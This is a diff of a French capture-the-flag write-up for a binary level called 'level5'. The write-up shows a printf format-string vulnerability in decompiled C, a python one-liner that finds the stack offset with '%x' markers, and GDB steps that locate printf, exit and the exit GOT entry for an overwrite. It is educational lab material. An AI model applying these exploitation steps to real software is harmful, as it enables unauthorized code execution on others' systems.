@@ -14,7 +14,7 @@ void n(void) {
     char local_20c [520];
     
     fgets(local_20c, 0x200, stdin);
-    printf(local_20c);  // Vulnérabilité ici
+    printf(local_20c);
     exit(1);
 }
 ```
@@ -45,7 +45,6 @@ Adresses critiques :
 ### 1. Recherche de l'Offset
 
 ```bash
-# Test avec un marqueur et des %x
 python -c "print 'AAAA' + '%x '*12" | ./level5
 ```
 
@@ -65,22 +64,21 @@ Processus de recherche :
 ### 2. Analyse avec GDB
 
 ```bash
-# Entrée dans GDB
 gdb ./level5
 
 # Recherche des adresses importantes
-(gdb) x o                  # Adresse de la fonction o
-(gdb) disas n              # Analyse de la fonction n
-(gdb) disas exit           # Analyse de la fonction exit
+(gdb) x o  
+(gdb) disas n
+(gdb) disas exit
 (gdb) x 0x8049838          # Vérification de l'adresse exit dans la GOT
 ```
 
 ### 3. Mise en Place des Breakpoints
 
 ```bash
-(gdb) disas n             # Pour localiser printf et exit
-(gdb) b printf            # Breakpoint sur printf
-(gdb) b exit              # Breakpoint sur exit
+(gdb) disas n
+(gdb) b <Addr_printf> 
+(gdb) b <Addr_exit>              # Breakpoint sur exit
 (gdb) run                 # Exécution du programme
 ```
 
